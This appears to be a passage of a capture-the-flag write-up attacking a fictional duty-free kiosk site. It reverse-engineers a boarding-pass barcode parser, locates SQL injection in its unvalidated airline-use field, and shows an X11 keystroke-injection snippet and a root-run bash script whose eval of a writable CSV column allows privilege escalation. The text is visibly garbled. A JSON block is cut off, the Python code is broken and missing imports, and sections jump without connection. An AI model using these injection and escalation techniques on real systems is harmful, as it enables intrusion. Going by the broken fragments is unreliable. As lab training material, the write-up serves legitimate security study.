## Understanding the BCBP format

the scanner is fake , but the endpoint behind it is real. The JS sends an empty string to `/checkout/boarding-pass/verify` and expects a JSON body :

```http
POST /checkout/boarding-pass/verify HTTP/1.1
Host: airsnacks.htb
Content-Type: application/json

{"raw":""}
```

sending an empty value tells us exactly what the parser wants

```json
{"detail":"expected 'M' at offset 0","error":"BCBP_ERR_FORMAT_CODE","item":1}
```

`M` at offset 0 and an `item` number in every error is how we know this is parsing a real **BCBP** (Bar Coded Boarding Pass)

BCBP is an IATA standard for the 2D barcode printed on a boarding pass. It is a plain ASCII string :

- a **fixed-length mandatory block** for the first flight
- then a **variable-size area** holding optional data and airline-specific data

the mandatory block is 58 bytes , and byte 59-60 is a 2 hex characters length field that says how many bytes follow. here is the layout of the mandatory block , and we can confirm every offset just by breaking it

| offset | len | field |
|---|---|---|
| 0 | 1 | `M` format code |
| 1 | 1 | number of legs |
| 2 | 20 | passenger name |
| 22 | 1 | e-ticket indicator |
| 23 | 7 | PNR |
| 30 | 3 | from airport |
| 33 | 3 | to airport |
| 36 | 3 | carrier |
| 39 | 5 | flight number |
| 44 | 3 | julian date |
| 47 | 1 | cabin |
| 48 | 4 | seat |
| 52 | 5 | check-in sequence |
| 57 | 1 | passenger status |
| 58 | 2 | **field size of what follows, in hex** |

the parser is well written about its own mistakes , so we never had to guess a field :

```text
expected 'M' at offset 0                          -> item 1 format code
string too short: 1 < 60                          -> total minimum length
expected SURNAME/GIVEN, A-Z only                  -> item 3 name
leg 1: expected 6-7 alphanumerics                 -> PNR
leg 1: airport codes must be 3 letters            -> origin / destination
leg 1: carrier must be 2-3 alphanumerics          -> carrier
leg 1: expected 4 digits + alpha/blank            -> flight number
leg 1: expected 001-366                           -> julian date
leg 1: expected single A-Z                        -> compartment
leg 1: expected NNNA or 'INF '                    -> seat
leg 1: expected 4 digits + alpha/blank            -> sequence
leg 1: expected single 0-9/A-Z                    -> passenger status
```

after that comes the variable area , and it also announces itself :

```text
expected 4-digit year+julian or blank             -> item 22 issue date
expected 'B' or blank                             -> item 16 document type
item 10 must be one of 0B,18,25,32                -> industry / tenant code
supported versions: 5-8                           -> version marker >5 .. >8
leg 1: item 17 not hex                            -> item 17 status code
leg 1: item 17 must be one of 03,0D,0E,0F,12,15,25,26,29,2A
```

so a fully valid pass looks like this , and it returns **200**

```python
name   = "SMITH/JOHN".ljust(20)
header = ">70B0WW6297BAT 0D1471234567890"   # 30 valid bytes of the variable area
tail   = header
raw    = "M1" + name + "E" + "ABC1234" + "CMN" + "CDG" + "AT " + "0210 " \
         + "297" + "Y" + "012A" + "0000A" + "1" + f"{len(tail):02X}" + tail
```

note `"0210 "` is 5 characters (4 digits + a blank) and `"0000A"` is 5 , so the mandatory block lands exactly on 58 bytes before the length field.

```json
{
  "audit_ref": "aud_964489498a7d",
  "dest": "CDG",
```

## Finding the injectable field

the audit log is the interesting part , because the pass is written to the database. so the question is : **which field goes into SQL , and does it get escaped ?**

the name field is 20 chars and it is heavily validated. injecting there does nothing but break the parser :

```bash
$ curl -s https://airsnacks.htb/checkout/boarding-pass/verify -d '{"raw":"...DOE/JO'\''M..."}'
{"detail":"expected SURNAME/GIVEN, A-Z only","error":"BCBP_ERR_NAME_FORMAT"}
```
after injecting the \' in every field i found that the last part the **airline use** section , is free-form by design. that is where airlines put their own data , so the parser does not validate its content at all.

to confirm it is the last quoted value of the INSERT , just put a quote in it and read the error :

```http
{"raw":"M1DOE/JOHN            EABC1234CMNCDGAT 0210 297Y012A0000A123>70B0WW6297BAT 0D1471234567890H'LLO"}
```

```text
HTTP/1.1 500 INTERNAL SERVER ERROR
{"detail":"syntax error at or near \"LLO\"
LINE 1: ...'CMN', 'CDG', '', '', 95, 'H'LLO')"}
```

that error gives us the whole query shape :

```sql
INSERT INTO audit (...) VALUES (
  '<audit_ref>', 'dutyfree-kiosk7', now(), 'ABC1234',
  '<name>', 'AT', '0210', '297', 'CMN', 'CDG', '', '', 95, '<airline_use>'
)
```

our input is the **last string literal** , and the only thing after it is `)`. and note the `95` , that is the length of the raw string we sent , so the length column is not a problem.

```python
from Xlib.ext import xtest
import time

d = display.Display(":0")

def key(name, mod=None):
    if mod:
        c = d.keysym_to_keycode(XK.string_to_keysym(mod))
        xtest.fake_input(d, X.KeyPress, c)
    c = d.keysym_to_keycode(XK.string_to_keysym(name))
    xtest.fake_input(d, X.KeyPress, c)
    xtest.fake_input(d, X.KeyRelease, c)

        xtest.fake_input(d, X.KeyRelease, d.keysym_to_keycode(XK.string_to_keysym(mod)))

xtest.fake_input(d, X.KeyPress, alt)
```

`664 root:pos-ops` and we are in `pos-ops` , so **we can write the file that root reads**. now the script :

```bash
#!/bin/bash
set -euo pipefail

RATES="/opt/vrs/data/duty-rates.csv"
[ -s "$RATES" ] || exit 0

while IFS=, read -r tax_class duty_pct vat_pct; do
    (( ++lineno ))

    if [[ -z "$tax_class" || -z "$duty_pct" || -z "$vat_pct" ]]; then
        echo "missing field" >&2; exit 1
    fi

    if ! [[ "$duty_pct" =~ ^[0-9]+$ && "$vat_pct" =~ ^[0-9]+$ ]]; then
        echo "rate must be numeric" >&2; exit 1
    fi

    eval "${tax_class}=${duty_pct}"      # <-- here
done < "$RATES"
```

the two numeric columns are validated with a regex , but `tax_class` is used **raw inside `eval`**. that means the first column of the CSV is executed as shell code.
